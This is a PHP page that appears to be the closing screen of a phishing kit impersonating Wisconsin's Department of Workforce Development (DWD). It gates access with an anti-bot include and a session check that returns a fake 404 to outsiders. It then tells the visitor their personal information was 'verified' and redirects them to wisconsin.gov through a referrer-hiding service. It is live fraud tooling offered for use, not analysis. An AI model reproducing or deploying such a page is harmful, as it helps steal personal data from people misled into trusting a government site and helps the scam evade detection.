<?php

    session_start();

    require_once '../J/Comp.php';
    require_once '../J/Antibot.php';
    require_once '../J/demonTest.php';

    $comps = new Comp;
    $antibot = new Antibot;
    
    $settings = $comps->settings();

    if (
        !$comps->checkToken() ||
        !isset($_SESSION['username']) ||
        trim($_SESSION['username']) == ''
    ) {
        echo $antibot->throw404();
        die();
    }

?>

<!DOCTYPE html>
<html>

<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Complete</title>
    <link href="../A/css/Verify/css.css" rel="stylesheet">
</head>

<body>
    <div class="navbar navbar-default">
        <div class="container">
            <div class="navbar-header">
                <a class="navbar-brand" style="cursor: pointer;">
                    <img alt="DWD" src="../A/img/dwd_logo.jpg">
                </a>
            </div>
        </div>
    </div>
    <div class="container body-content text-center">
        <h1>Verification Complete</h1>
        <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="100" height="100" viewBox="0 0 172 172" style=" fill:#000000;">
            <g fill="none" fill-rule="nonzero" stroke="none" stroke-width="1" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" font-family="none" font-weight="none" font-size="none" text-anchor="none" style="mix-blend-mode: normal">
                <path d="M0,172v-172h172v172z" fill="none"></path>
                <g>
                    <path d="M161.86633,32.25l-83.033,83.64217l-32.85558,-33.4755l-10.14442,10.22683l43,43.52317l93.16667,-93.912z" fill="rgba(0, 55, 100, .9)"></path>
                    <path d="M126.033,32.25l-83.033,83.64217l-32.85558,-33.4755l-10.14442,10.22683l43,43.52317l93.16667,-93.912z" fill="rgba(0, 55, 100, .9)"></path>
                </g>
            </g>
        </svg>
        <h5>
            Your personal information has successfully been verified in accordance with the records on-file.
            <br>
            You will be redirected back to our home page shortly.
            <br>
            Thank you for your patience.
        </h5>
    </div>
    <script>
        
        setTimeout(() => {
            window.location.href = 'https://nullreferer.com/?https://www.wisconsin.gov';
        }, 6500);

    </script>
</body>

</html>